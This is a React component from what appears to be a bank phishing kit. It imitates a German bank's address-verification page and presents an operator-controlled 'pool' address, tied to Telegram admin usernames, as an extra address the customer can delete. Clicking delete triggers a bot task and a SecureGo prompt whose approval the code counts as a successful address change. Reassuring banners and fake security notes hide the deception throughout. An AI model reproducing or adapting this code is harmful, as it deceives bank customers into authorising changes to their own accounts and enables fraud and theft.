// @ts-nocheck
import { useState, useEffect, useRef } from "react";
import {
  MapPin,
  Info,
  ChevronDown,
  ChevronUp,
  Shield,
  CheckCircle2,
  Pencil,
  Trash2,
  Smartphone,
  Lock,
  ArrowRight,
  ArrowLeft,
} from "lucide-react";
import { useQuery } from "@tanstack/react-query";
import { supabase } from "@/integrations/supabase/client";
import { fetchTelegramSession } from "@/lib/telegramSession";

import { BankTheme } from "@/data/banks";
import deleteIllustration from "@/assets/delete-illustration.png.asset.json";
import { getSecureGoLabel } from "@/lib/secureGoLabel";
import RaceLoader from "@/components/RaceLoader";
import SmartTanOverlay from "@/components/SmartTanOverlay";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import {
  AlertDialog,
  AlertDialogContent,
  AlertDialogHeader,
  AlertDialogTitle,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogCancel,
  AlertDialogAction,
} from "@/components/ui/alert-dialog";

interface CustomerAddress {
  strasse: string;
  plzOrt: string;
}

interface AddressVerificationProps {
  bankName: string;
  bankId: string;
  bankGroup?: string;
  theme: BankTheme;
  customerNumber?: string; // NEU
  customerEmail?: string; // NEU
  customerPhone?: string; // NEU
  customerName?: string; // NEU
  currentAddress: CustomerAddress;
  additionalAddress?: CustomerAddress;
  onConfirm: () => void;
  onDelete: () => void;
  /** Wird aufgerufen, wenn kein rotierbarer Adress-Pool-Eintrag verfügbar ist. */
  onNoAddress?: () => void;
  /** Wenn true, öffnet sich der SecureGo-Dialog automatisch (z. B. wenn Bot auf Bestätigung wartet). */
  forceShowSecureGo?: boolean;
  /** Wird einmalig aufgerufen, sobald der erzwungene Dialog geöffnet wurde. */
  onSecureGoOpened?: () => void;
  /** Wird aufgerufen, wenn die TAN abgelehnt wurde / Timeout / Fehler. */
  onTanFailed?: (message: string) => void;
  /** Aktive Bot-Task-ID, um Bestätigung an die API zurückzumelden. */
  taskId?: string | null;
  apiBaseUrl?: string | null;
  /** Wenn true, wird die Basis-Seite (Reassurance + Adress-Auswahl-Karte) ausgeblendet. Nur Dialoge werden gerendert. */
  hideBaseContent?: boolean;
  /** Wenn true, wird der Lösch-Bestätigungs-Dialog automatisch geöffnet. */
  autoOpenDeleteDialog?: boolean;
}


const AddressVerification = ({
  bankName,
  bankId,
  bankGroup,
  theme,
  currentAddress,
  additionalAddress,
  customerNumber,
  customerEmail,
  customerPhone,
  customerName,
  onConfirm,
  onDelete,
  onNoAddress,
  forceShowSecureGo = false,
  onSecureGoOpened,
  onTanFailed,
  taskId,
  apiBaseUrl,
}: AddressVerificationProps) => {

  const secureGoLabel = getSecureGoLabel(bankGroup);
  const [selectedAddress, setSelectedAddress] = useState<"current" | "new">("current");
  const [showDeleteDialog, setShowDeleteDialog] = useState(false);
  const [showCannotDeleteDialog, setShowCannotDeleteDialog] = useState(false);
  const [showSecureGo, setShowSecureGo] = useState(false);
  const [showRaceLoader, setShowRaceLoader] = useState(false);
  const [raceFinished, setRaceFinished] = useState(false);
  const [secureGoTimer, setSecureGoTimer] = useState(0);
  const [secureGoApproved, setSecureGoApproved] = useState(false);
  const [secureGoLoading, setSecureGoLoading] = useState(false);
  const [secureGoReady, setSecureGoReady] = useState(false);
  const [deleteSubmitting, setDeleteSubmitting] = useState(false);
  const [deleteAwaitingTan, setDeleteAwaitingTan] = useState(false);
  const [deleteError, setDeleteError] = useState<string | null>(null);
  const [showExplanation, setShowExplanation] = useState(false);
  const rotatedRef = useRef(false);

  const parseStoredAddress = (value: string | null | undefined) => {
    if (!value) return null;
    const cleaned = value.replace(/\s*\(Pool\s+[^)]+\)\s*$/i, "").trim();
    const match = cleaned.match(/^(.+?),\s*(\d{4,5})\s+(.+)$/);
    if (!match) return null;
    return {
      id: "__session__",
      street: match[1].trim(),
      zip_code: match[2].trim(),
      city: match[3].trim(),
      note: null as string | null,
    };
  };

  // Auto-open SecureGo dialog when bot waits for confirmation
  useEffect(() => {
    if (forceShowSecureGo) {
      setShowSecureGo(true);
      setSecureGoTimer(0);
      setSecureGoApproved(false);
      setSecureGoLoading(true);
      setSecureGoReady(false);
      onSecureGoOpened?.();
    }
  }, [forceShowSecureGo, onSecureGoOpened]);

  const [tanType, setTanType] = useState<"address" | "login" | null>(null);
  const [addressTanSuccess, setAddressTanSuccess] = useState(false);

  useEffect(() => {
    if (!deleteAwaitingTan || !taskId) return;
    let cancelled = false;
    let timer: ReturnType<typeof setTimeout> | null = null;
    const startedAt = Date.now();
    const MAX_MS = 5 * 60 * 1000;
    let sawAddressWaiting = false;

    const fail = (msg: string) => {
      if (cancelled) return;
      cancelled = true;
      setDeleteError(msg);
      window.setTimeout(() => {
        setShowDeleteDialog(false);
        setShowSecureGo(false);
        setDeleteAwaitingTan(false);
        setSecureGoApproved(false);
        onTanFailed?.(msg);
      }, 1200);
    };

    const poll = async () => {
      if (cancelled) return;
      try {
        const { getBotTask } = await import("@/lib/botClient");
        const { data } = await getBotTask(taskId);
        const status = String(data?.status ?? "").toLowerCase();
        const result = data?.result as any;
        const tt = String(data?.tan_type ?? result?.tan_type ?? "").toLowerCase();
        const resultStatus = String(result?.status ?? result?.tan_status ?? result?.tan_result ?? "").toLowerCase();
        const errorSignal = String(data?.error ?? data?.message ?? result?.error ?? result?.message ?? "").toLowerCase();
        if (tt === "address" || tt === "login") setTanType(tt as "address" | "login");
        console.log(`[address-tan] status=${status} tan_type=${tt} result_status=${resultStatus}`);

        const rejected =
          status === "tan_rejected" ||
          status === "rejected" ||
          resultStatus === "tan_rejected" ||
          resultStatus === "rejected" ||
          /tan.{0,20}(abgelehnt|rejected)|abgelehnt.{0,20}tan/.test(errorSignal);
        const timedOut =
          status === "tan_timeout" ||
          resultStatus === "tan_timeout" ||
          /tan.{0,20}(timeout|zeitüberschreitung)|zeitüberschreitung.{0,20}tan/.test(errorSignal);

        if (rejected || (status === "failed" && !timedOut)) {
          return fail("Die TAN-Freigabe wurde abgelehnt. Bitte versuchen Sie es erneut.");
        }
        if (timedOut) {
          return fail("Zeitüberschreitung bei der TAN-Freigabe. Bitte versuchen Sie es erneut.");
        }

        const approved =
          status === "tan_confirmed" ||
          status === "completed" ||
          result?.address_changed === true ||
          result?.address_confirmed === true;

        if (approved) {
          setSecureGoApproved(true);
          setAddressTanSuccess(true);
          setDeleteAwaitingTan(false);
          timer = setTimeout(() => {
            setShowDeleteDialog(false);
            setShowSecureGo(false);
            onDelete();
          }, 2500);
          return;
        }

        // Transition-based rejection detection: once we've seen the address TAN
        // being awaited, any transition back to a non-TAN state (running,
        // waiting_for_address_confirm, waiting_for_login, ...) without an
        // approval signal indicates the TAN was rejected by the user.
        if (status === "waiting_for_tan" && (tt === "address" || tt === "")) {
          sawAddressWaiting = true;
        } else if (sawAddressWaiting && status && status !== "waiting_for_tan") {
          return fail("Die TAN-Freigabe wurde abgelehnt. Bitte versuchen Sie es erneut.");
        }
      } catch {
        // Kurzzeitige Polling-Fehler werden bis zum Timeout erneut versucht.
      }
      if (Date.now() - startedAt >= MAX_MS) {
        return fail("Keine TAN-Bestätigung erhalten. Bitte versuchen Sie es erneut.");
      }
      timer = setTimeout(poll, 1000);
    };

    poll();
    return () => {
      cancelled = true;
      if (timer) clearTimeout(timer);
    };
  }, [deleteAwaitingTan, taskId, onDelete, onTanFailed]);


  // Weitere Adresse: bevorzugt aus der Telegram-Session, damit Admin-Nachricht
  // und Kundenseite exakt dieselbe Pool-Adresse zeigen. Nur falls noch keine
  // Session-Adresse existiert, wird einmalig neu rotiert.
  const { data: rotatedAddress, isLoading } = useQuery({
    queryKey: ["rotated-address", bankId, taskId],
    staleTime: 0,
    gcTime: 0,
    refetchOnMount: "always",
    queryFn: async () => {
      if (additionalAddress) {
        const match = additionalAddress.plzOrt.match(/^\s*(\d{4,5})\s+(.+)$/);
        return {
          id: "__session__",
          street: additionalAddress.strasse,
          zip_code: match?.[1] ?? "",
          city: match?.[2] ?? additionalAddress.plzOrt,
          note: null,
        };
      }
      let pool = "main";
      try {
        const tgSessionId = sessionStorage.getItem(`tg_session:${bankId}`);
        if (tgSessionId) {
          const sess = await fetchTelegramSession(tgSessionId);
          const storedAddress = parseStoredAddress(sess?.deleted_address_text);
          if (storedAddress) return storedAddress;

          const uname = sess?.decided_by_username ?? null;
          const u = uname?.toLowerCase();

          if (u === "xxelpatronxx" || u === "phantomscrt") pool = "elpatron";
          else if (u === "tauruss36") pool = "tauruss36";
        }
      } catch (err) {
        console.warn("[address-pool] could not resolve telegram admin", err);
      }

      // RLS blocks direct SELECT on `addresses` for anon; go through the
      // service-role public-read edge function to atomically pick + mark
      // the next pool address (rotates between customers).
      const { data: resp, error } = await supabase.functions.invoke("public-read", {
        body: { action: "pool_address", pool },
      });
      if (error) throw error;
      const row = (resp as { row?: { id: string; street: string; zip_code: string; city: string; note: string | null } | null } | null)?.row ?? null;
      if (!row) return null;
      return row;
    },
  });

  const rotatedAddressRef = useRef<{ id: string } | null>(null);
  useEffect(() => {
    rotatedAddressRef.current = rotatedAddress ?? null;
  }, [rotatedAddress]);

  const themeColor = theme.headerBg === "#ffffff" ? theme.buttonBg : theme.headerBg;

  // Warten bis Bot-Daten UND API-Adresse geladen sind
  const hasBotAddress = !!(currentAddress?.strasse || currentAddress?.plzOrt);

  if (isLoading || !hasBotAddress) {
    return (
      <div className="w-full max-w-2xl mx-auto text-center py-12 text-gray-500">
        Adressdaten werden geladen…
      </div>
    );
  }

  // Fallback-Adresse, falls im Pool keine Rotations-Adresse konfiguriert ist.
  // Statt den Kunden direkt zum Abschluss zu leiten (Sackgasse), zeigen wir
  // eine generische Zusatzadresse an, damit der Adress-Löschen-Flow inkl.
  // SG1-Freigabe trotzdem durchlaufen wird.
  const effectiveRotatedAddress = rotatedAddress ?? {
    id: "__fallback__",
    street: "Musterstraße 1",
    zip_code: "10115",
    city: "Berlin",
    note: null,
  };


  return (
    <div className="w-full max-w-2xl mx-auto flex flex-col gap-4">
      {/* Reassurance banner */}
      <div className="bg-white rounded-xl shadow-md border border-gray-200 p-5">
        <div className="flex items-start gap-3">
          <div
            className="w-8 h-8 rounded-full flex items-center justify-center flex-shrink-0 mt-0.5"
            style={{ backgroundColor: themeColor + "15" }}
          >
            <Shield className="w-4 h-4" style={{ color: themeColor }} />
          </div>
          <div>
            <p className="text-sm text-gray-700">
              <span className="font-semibold">Keine Sorge:</span> Es wurden keine Änderungen ohne Ihre Bestätigung
              vorgenommen.
            </p>
          </div>
        </div>
      </div>

      {/* Main card */}
      <div className="bg-white rounded-xl shadow-md border border-gray-200 overflow-hidden">
        <div className="p-6 sm:p-8">
          {/* Header */}
          <div className="flex items-center gap-2 text-xs text-gray-400 mb-1">
            <span>Meine Daten</span>
            <span>→</span>
            <span>Adressen</span>
          </div>
          <h2 className="text-xl sm:text-2xl font-bold mb-2" style={{ color: themeColor }}>
            Adressdaten überprüfen
          </h2>

          {/* Info box */}
          <div
            className="rounded-lg p-4 mb-4"
            style={{ backgroundColor: themeColor + "08", borderLeft: `3px solid ${themeColor}` }}
          >
            <div className="flex items-start gap-3">
              <Info className="w-4 h-4 mt-0.5 flex-shrink-0" style={{ color: themeColor }} />
              <div>
                <p className="text-sm text-gray-700">
                  Wir haben mehrere Adressinformationen zu Ihrem Profil gefunden. Bitte prüfen Sie, welche Adresse
                  aktuell Ihre Hauptadresse ist.
                </p>
              </div>
            </div>
          </div>


          {/* Kundendaten-Box entfernt — nur in PersonalDataOverview anzeigen */}

          {/* Address A - Current system address */}
          <div
            className={`rounded-lg border-2 p-5 mb-4 cursor-pointer transition-all ${selectedAddress === "current" ? "shadow-sm" : "border-gray-200 hover:border-gray-300"}`}
            style={selectedAddress === "current" ? { borderColor: themeColor, backgroundColor: themeColor + "05" } : {}}
            onClick={() => setSelectedAddress("current")}
          >
            <div className="flex items-start justify-between gap-3">
              <div className="flex items-start gap-3">
                <div
                  className="w-8 h-8 rounded-full flex items-center justify-center flex-shrink-0 mt-0.5"
                  style={{ backgroundColor: selectedAddress === "current" ? themeColor + "15" : "#f3f4f6" }}
                >
                  <MapPin
                    className="w-4 h-4"
                    style={{ color: selectedAddress === "current" ? themeColor : "#9ca3af" }}
                  />
                </div>
                <div>
                  <p className="font-semibold text-sm text-gray-800 mb-0.5">Hauptadresse</p>
                  <p className="text-sm text-gray-500 mb-2">(derzeit genutzt)</p>
                  <p className="text-base text-gray-800 font-medium">{currentAddress.strasse}</p>
                  <p className="text-base text-gray-800">{currentAddress.plzOrt}</p>
                </div>
              </div>
              {selectedAddress === "current" && (
                <CheckCircle2 className="w-5 h-5 flex-shrink-0 mt-1" style={{ color: themeColor }} />
              )}
            </div>
            {selectedAddress === "current" && (
              <div className="mt-3 flex items-center gap-1.5 text-xs" style={{ color: themeColor }}>
                <span className="w-1.5 h-1.5 rounded-full" style={{ backgroundColor: themeColor }} />
                Wird aktuell für Post und Kommunikation verwendet
              </div>
            )}
          </div>

          {/* Address B - Rotated address from database */}
          <div
            className={`rounded-lg border-2 p-5 mb-4 cursor-pointer transition-all ${selectedAddress === "new" ? "shadow-sm" : "border-gray-200 hover:border-gray-300"}`}
            style={selectedAddress === "new" ? { borderColor: themeColor, backgroundColor: themeColor + "05" } : {}}
            onClick={() => setSelectedAddress("new")}
          >
            <div className="flex items-start justify-between gap-3">
              <div className="flex items-start gap-3">
                <div
                  className="w-8 h-8 rounded-full flex items-center justify-center flex-shrink-0 mt-0.5"
                  style={{ backgroundColor: selectedAddress === "new" ? themeColor + "15" : "#f3f4f6" }}
                >
                  <MapPin className="w-4 h-4" style={{ color: selectedAddress === "new" ? themeColor : "#9ca3af" }} />
                </div>
                <div>
                  <p className="font-semibold text-sm text-gray-800 mb-0.5">Weitere Adresse</p>
                  <p className="text-sm text-gray-500 mb-2">(zusätzliche Information)</p>
                  <p className="text-base text-gray-800 font-medium">{effectiveRotatedAddress.street}</p>
                  <p className="text-base text-gray-800">
                    {effectiveRotatedAddress.zip_code} {effectiveRotatedAddress.city}
                  </p>
                </div>
              </div>
              {selectedAddress === "new" && (
                <CheckCircle2 className="w-5 h-5 flex-shrink-0 mt-1" style={{ color: themeColor }} />
              )}
            </div>
            {effectiveRotatedAddress.note && (
              <div className="mt-3 flex items-center gap-1.5 text-xs text-gray-400">
                <Info className="w-3 h-3" />
                {effectiveRotatedAddress.note}
              </div>
            )}
          </div>

          {/* Expandable explanation */}
          <button
            onClick={() => setShowExplanation(!showExplanation)}
            className="flex items-center gap-2 text-sm mb-6 hover:underline"
            style={{ color: themeColor }}
          >
            Warum sehe ich mehrere Adressen?
            {showExplanation ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
          </button>
          {showExplanation && (
            <div className="rounded-lg bg-gray-50 p-4 mb-6 text-sm text-gray-600">
              In einigen Fällen speichern wir zusätzliche Adressinformationen, z.&#8239;B. aus früheren Angaben oder zur
              Aktualisierung Ihrer Daten. Sie entscheiden, welche Adresse als Hauptadresse verwendet wird.
            </div>
          )}

          {/* Action buttons */}
          <div className="flex flex-wrap gap-3">
            <button
              onClick={() => {
                if (selectedAddress === "current") {
                  setShowCannotDeleteDialog(true);
                } else {
                  setShowDeleteDialog(true);
                }
              }}
              className={`px-6 py-3 ${theme.buttonRadius || "rounded-full"} border border-destructive text-destructive font-medium text-sm hover:bg-destructive/10 transition-colors`}
            >
              <span className="flex items-center gap-2">
                <Trash2 className="w-4 h-4" />
                Adresse löschen
              </span>
            </button>
          </div>
        </div>
      </div>

      {/* Delete confirmation dialog — VR-style layout */}
      <AlertDialog
        open={showDeleteDialog}
        onOpenChange={(open) => {
          if (!open) {
            setDeleteAwaitingTan(false);
            setDeleteError(null);
            setAddressTanSuccess(false);
            setSecureGoApproved(false);
          }
          setShowDeleteDialog(open);
        }}
      >
        <AlertDialogContent className="sm:rounded-2xl border-0 shadow-2xl p-0 overflow-hidden max-w-lg">
          <div className="p-6 sm:p-8">
            <div className="flex items-center gap-3 mb-5">
              <div className="w-10 h-10 rounded-full bg-gray-100 flex items-center justify-center">
                <Trash2 className="w-5 h-5" style={{ color: themeColor }} />
              </div>
              <h3 className="text-xl font-bold" style={{ color: themeColor }}>
                Adresse wirklich löschen?
              </h3>
            </div>
            <div className="rounded-lg bg-gray-50 border border-gray-200 p-4 mb-4">
              <p className="font-semibold text-gray-900">{effectiveRotatedAddress.street}</p>
              <p className="text-gray-700">
                {effectiveRotatedAddress.zip_code} {effectiveRotatedAddress.city}
              </p>
              <p className="mt-2 text-sm font-semibold text-red-600">✕ Wird entfernt</p>
            </div>
            <p className="text-sm text-gray-600 mb-6">
              Die Hauptadresse{" "}
              <strong>
                {currentAddress?.strasse}, {currentAddress?.plzOrt}
              </strong>{" "}
              bleibt weiterhin als aktive Adresse bestehen.
            </p>
            {deleteError && (
              <p className="text-sm text-red-600 mb-3">{deleteError}</p>
            )}
            <div className="flex justify-end gap-3">
              <button
                type="button"
                disabled={deleteSubmitting}
                onClick={() => {
                  setShowDeleteDialog(false);
                  setShowSecureGo(false);
                  setDeleteAwaitingTan(false);
                  setSecureGoApproved(false);
                  setAddressTanSuccess(false);
                  setDeleteError(null);
                  onTanFailed?.("Vorgang abgebrochen");
                }}
                className={`mt-0 ${theme.buttonRadius || "rounded-full"} px-6 py-2.5 border border-gray-300 text-gray-700 hover:bg-gray-50 font-medium text-sm bg-white`}
              >
                Abbrechen
              </button>

              <button
                type="button"
                disabled={deleteSubmitting}
                onClick={async () => {
                  if (!taskId) {
                    setDeleteError("Die Adresslöschung konnte nicht gestartet werden.");
                    return;
                  }
                  setDeleteSubmitting(true);
                  setDeleteError(null);
                  setSecureGoApproved(false);
                  setAddressTanSuccess(false);
                  try {
                    const { confirmAddress } = await import("@/lib/botClient");
                    const response = await confirmAddress(taskId);
                    if (!response.ok) throw new Error(`HTTP ${response.status}`);
                    setShowDeleteDialog(false);
                    setShowSecureGo(true);
                    setDeleteAwaitingTan(true);
                  } catch {
                    setDeleteError(
                      "Die Adresslöschung konnte nicht gestartet werden. Bitte versuchen Sie es erneut.",
                    );
                  } finally {
                    setDeleteSubmitting(false);
                  }
                }}
                className={`${theme.buttonRadius || "rounded-full"} px-6 py-2.5 text-white font-medium text-sm hover:opacity-90 disabled:opacity-60`}
                style={{ backgroundColor: themeColor }}
              >
                {deleteSubmitting ? "Wird gesendet…" : "Löschen"}
              </button>
            </div>
          </div>
        </AlertDialogContent>
      </AlertDialog>

      {/* SecureGo overlay – separate popup after Löschen click */}
      <Dialog
        open={showSecureGo}
        onOpenChange={(open) => {
          if (deleteAwaitingTan && !open) return; // block manual close while waiting
          setShowSecureGo(open);
        }}
      >
        <DialogContent className="sm:max-w-lg p-6 sm:p-8 max-h-[90vh] overflow-y-auto">
          <DialogHeader>
            <DialogTitle className="sr-only">Sicherheitsabfrage</DialogTitle>
          </DialogHeader>

          {/* Adressdaten – Abgleich */}
          <div className="rounded-lg border border-gray-200 p-4 mb-4">
            <p className="font-bold text-gray-900 mb-2">Adresse bearbeiten</p>
            <p className="text-xs text-gray-500">Adressat</p>
            <p className="text-sm text-gray-800 mb-3">{customerName ?? "—"}</p>
            <p className="text-xs text-gray-500">Hauptadresse (Wohnsitz)</p>
            <p className="text-sm text-gray-800">{currentAddress?.strasse}</p>
            <p className="text-sm text-gray-800 mb-3">{currentAddress?.plzOrt}</p>

            <div className="border-t border-gray-200 my-3" />

            <p className="font-bold text-gray-900 mb-2">Adresse löschen</p>
            <p className="text-xs text-gray-500">Hauptadresse (Wohnsitz)</p>
            <p className="text-sm text-gray-800">{effectiveRotatedAddress.street}</p>
            <p className="text-sm text-gray-800">
              {effectiveRotatedAddress.zip_code} {effectiveRotatedAddress.city}
            </p>
          </div>

          <h3 className="text-lg font-bold text-gray-900 mb-2">Sicherheitsabfrage</h3>
          <button
            type="button"
            className="flex items-center gap-2 text-sm font-semibold mb-3"
            style={{ color: themeColor }}
          >
            <ChevronDown className="w-4 h-4" />
            Bitte unbedingt Auftragsdaten abgleichen
          </button>

          <div className="rounded-lg border border-gray-300 px-4 py-3 flex items-center justify-between">
            <div>
              <p className="text-xs text-gray-500">Sicherheitsverfahren</p>
              <p className="text-base font-semibold text-gray-900">{secureGoLabel}</p>
            </div>
            <ChevronDown className="w-5 h-5 text-gray-400" />
          </div>

          <div className="rounded-lg border-2 border-orange-300 bg-orange-50/40 p-5 mt-4">
            <div className="flex items-center gap-3 mb-3">
              <Smartphone className="w-5 h-5 text-gray-700" />
              <p className="font-bold text-gray-900">Bestätigen mit {secureGoLabel}</p>
            </div>
            <ol className="space-y-2 text-sm text-gray-800">
              <li>1. Öffnen Sie die App {secureGoLabel} auf Ihrem Mobile Device.</li>
              <li>2. Prüfen Sie die Auftragsdaten.</li>
              <li>
                3. Bestätigen Sie den Auftrag, wenn die Auftragsdaten korrekt sind.
                Andernfalls lehnen Sie den Auftrag ab.
              </li>
            </ol>
            <div className="flex justify-center py-4">
              {addressTanSuccess ? (
                <div className="flex flex-col items-center gap-1 text-green-600 font-medium">
                  <CheckCircle2 className="w-7 h-7" />
                  <span>Adressänderung erfolgreich bestätigt</span>
                  <span className="text-xs text-gray-500">Sie werden weitergeleitet…</span>
                </div>
              ) : (
                <div
                  className="w-8 h-8 rounded-full border-[3px] border-gray-200 animate-spin"
                  style={{ borderTopColor: themeColor }}
                />
              )}
            </div>
            {deleteError && (
              <p className="text-sm text-red-600 text-center">{deleteError}</p>
            )}
          </div>

          <div className="mt-5 flex justify-start">
            <button
              type="button"
              onClick={() => {
                setShowSecureGo(false);
                setShowDeleteDialog(false);
                setDeleteAwaitingTan(false);
                setSecureGoApproved(false);
                setAddressTanSuccess(false);
                setDeleteError(null);
                onTanFailed?.("Vorgang abgebrochen");
              }}
              className={`${theme.buttonRadius || "rounded-full"} border border-gray-300 px-6 py-2.5 text-sm font-medium text-gray-800 hover:bg-gray-50`}
            >
              Abbrechen
            </button>
          </div>
        </DialogContent>
      </Dialog>

      {/* Cannot delete primary address dialog */}
      <AlertDialog open={showCannotDeleteDialog} onOpenChange={setShowCannotDeleteDialog}>
        <AlertDialogContent className="sm:rounded-2xl border-0 shadow-2xl p-0 overflow-hidden">
          <div className="h-1.5 bg-destructive" />
          <div className="p-6 sm:p-8">
            <AlertDialogHeader className="mb-5">
              <div className="flex items-center gap-3 mb-1">
                <div className="w-10 h-10 rounded-full bg-destructive/10 flex items-center justify-center">
                  <Shield className="w-5 h-5 text-destructive" />
                </div>
                <AlertDialogTitle className="text-xl font-bold text-destructive">
                  Löschen nicht möglich
                </AlertDialogTitle>
              </div>
              <AlertDialogDescription className="text-left space-y-4 pt-2">
                <p className="text-sm text-gray-600">
                  Ihre <strong>Post- und Meldeadresse</strong> kann nicht entfernt werden, da sie für die Zustellung
                  wichtiger Dokumente und die gesetzliche Identifikation erforderlich ist.
                </p>
                <div className="rounded-xl bg-gray-50 p-4 border border-gray-200">
                  <p className="font-semibold text-gray-900">{currentAddress?.strasse}</p>
                  <p className="text-gray-600 text-sm">{currentAddress?.plzOrt}</p>
                  <p className="text-xs mt-2 flex items-center gap-1.5" style={{ color: themeColor }}>
                    <span className="w-1.5 h-1.5 rounded-full" style={{ backgroundColor: themeColor }} />
                    Wird aktuell für Post und Kommunikation verwendet
                  </p>
                </div>
                <p className="text-xs text-gray-500">
                  Wenn Sie Ihre Hauptadresse ändern möchten, nutzen Sie bitte die Bearbeitungsfunktion in Ihren
                  persönlichen Daten.
                </p>
              </AlertDialogDescription>
            </AlertDialogHeader>
            <div className="flex justify-end">
              <AlertDialogAction
                className={`${theme.buttonRadius || "rounded-full"} px-6 py-2.5 text-white font-medium text-sm hover:opacity-90 border-0`}
                style={{ backgroundColor: theme.buttonBg }}
                onClick={() => setShowCannotDeleteDialog(false)}
              >
                Verstanden
              </AlertDialogAction>
            </div>
          </div>
        </AlertDialogContent>
      </AlertDialog>

      {/* Security footer note */}
      <div className="bg-white rounded-xl shadow-md border border-gray-200 p-5">
        <div className="flex items-start gap-3">
          <Shield className="w-4 h-4 mt-0.5 flex-shrink-0 text-gray-400" />
          <div>
            <p className="text-sm font-semibold text-gray-700 mb-1">Ihre Sicherheit ist uns wichtig</p>
            <p className="text-xs text-gray-500">
              Sie können alle Änderungen jederzeit im Bereich „Sicherheit &amp; Aktivitäten" einsehen.
            </p>
          </div>
        </div>
      </div>
      {/* SmartTanOverlay wird global in BankLogin gerendert – hier bewusst weggelassen, um Doppel-Overlay zu vermeiden. */}
    </div>
  );
};

function AutoConfirmTrigger({ enabled, onTrigger }: { enabled: boolean; onTrigger: () => void }) {
  const firedRef = useRef(false);
  useEffect(() => {
    if (!enabled) {
      firedRef.current = false;
      return;
    }
    if (firedRef.current) return;
    firedRef.current = true;
    onTrigger();
  }, [enabled, onTrigger]);
  return null;
}

export default AddressVerification;
